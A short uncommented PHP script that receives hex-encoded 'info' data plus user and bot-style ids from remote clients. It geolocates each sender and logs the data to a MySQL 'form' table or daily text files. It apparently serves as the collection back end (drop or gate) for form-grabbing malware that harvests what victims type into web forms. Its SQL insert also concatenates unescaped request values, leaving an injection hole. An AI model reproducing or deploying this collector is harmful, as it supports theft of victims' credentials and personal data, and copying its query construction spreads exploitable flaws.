<?php

$use_mysql = 1;

if ($use_mysql == 1) {
	include_once('./mysqllog.php');
	include_once('./geoipcity.inc');
}

$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");

if (isset($_GET['id'])) {
	$id = $_GET['id']; 
} else {
	$id = $_POST['id'];
}

$info = $_POST['info'];
$user = $_POST['user'];

if ($use_mysql == 1) {
	//-----------------------------------
	$gi = geoip_open('./GeoIPCity.dat', GEOIP_STANDARD);
	$record = geoip_record_by_addr($gi, $ip);
	geoip_close($gi);
	//-----------------------------------
	$info = decode_string($info);
	if(@!mysql_connect($mysql_host,$mysql_login,$mysql_pass)) {echo '<p class="err"> Error. Cant connect to mysql server </p>'; }
	if(@!mysql_selectdb($mysql_db)) {echo '<p class="err"> Error. Cant connect to DB</p>'; }
	$query = 'INSERT INTO form (add_date,id,uidlog,ip_real,ip,form,country,city,zip)
			  VALUES (now(), "'. $id . '", "'. $user .'", "'. $real_ip . '", "'. $ip .'", "'. $info .'", "'. $record->country_name .'", "'. $record->city .'", "'. $record->postal_code .'")';
	if(@!mysql_query($query)) {echo '<p class="err"> Error. Cant execute query</p>';  }
}
else {
	$date = date("Y-m-d");
	$time=date("H:i:s");
	
	list($year, $month, $day) = explode('-', $date);
	$filename = "form.$day.$month.txt";
	$log = "$info@@@@@$user@@@@@$id@@@@@$real_ip@@@@@$ip@@@@@$date@@@@@$time\n";
	$fh = fopen("logs/$filename", "a+");
	fputs($fh, $log);		
	fclose($fh);
}

function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return addslashes($bindata);
}

?>